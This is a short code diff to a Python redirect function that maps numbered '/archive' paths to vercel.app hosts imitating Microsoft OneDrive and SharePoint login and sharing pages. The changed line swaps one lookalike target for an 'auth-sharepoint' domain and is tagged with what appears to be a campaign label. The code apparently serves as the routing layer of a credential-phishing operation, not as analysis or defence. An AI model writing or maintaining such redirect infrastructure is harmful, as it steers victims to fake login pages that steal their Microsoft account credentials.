@@ -17,7 +17,7 @@ def get_redirect_url(path):
     elif path == '/archive6':
         return 'https://secure-sharing.vercel.app/archive7'
     elif path == '/archive7456':
-        return 'https://secured-onedrive-xhv.vercel.app/' # NBA-G
+        return 'https://auth-sharepoint.vercel.app/' # NBA-G
     elif path == '/archive8':
         return 'https://onedrive-sharing.vercel.app/'
     elif path == '/archive3467':
